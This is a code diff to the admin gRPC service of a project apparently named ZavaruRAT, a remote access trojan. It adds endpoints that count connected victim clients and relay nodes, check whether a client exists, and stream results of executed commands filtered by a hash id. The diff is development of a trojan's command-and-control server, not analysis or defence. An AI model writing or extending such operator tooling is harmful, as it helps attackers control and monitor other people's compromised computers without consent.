@@ -1,5 +1,6 @@
 #region
 
+using System.Reactive.Linq;
 using Google.Protobuf.WellKnownTypes;
 using Grpc.Core;
 using ZavaruRAT.Main.Runtime;
@@ -34,14 +35,36 @@ public sealed class AdminService : AdminHub.AdminHubBase
         return Task.FromResult(new Empty());
     }
 
-    public override async Task CommandResults(Empty request, IServerStreamWriter<CommandExecutedEvent> responseStream,
+    public override Task<Statistics> NetworkStatistics(Empty request, ServerCallContext context)
+    {
+        var stats = new Statistics
+        {
+            Clients = _storage.Clients.Sum(x => x.Value.Count),
+            Nodes = _storage.Clients.Count
+        };
+
+        return Task.FromResult(stats);
+    }
+
+    public override Task<ClientExistsResponse> ClientExists(ClientExistsRequest request, ServerCallContext context)
+    {
+        var (nodeId, client) = _storage.GetClient(request.ClientId);
+
+        return Task.FromResult(new ClientExistsResponse
+        {
+            Exists = client != null
+        });
+    }
+
+    public override async Task CommandResults(CommandResultsRequest request,
+                                              IServerStreamWriter<CommandExecutedEvent> responseStream,
                                               ServerCallContext context)
     {
         _logger.LogInformation("Admin {Admin} subscribed to command executed updates", context.Host);
 
         try
         {
-            var commands = _storage.GetCommandResults();
+            var commands = _storage.GetCommandResults().Where(x => x.HashId == request.HashId);
 
             await foreach (var ev in commands.ToAsyncEnumerable().WithCancellation(context.CancellationToken))
             {
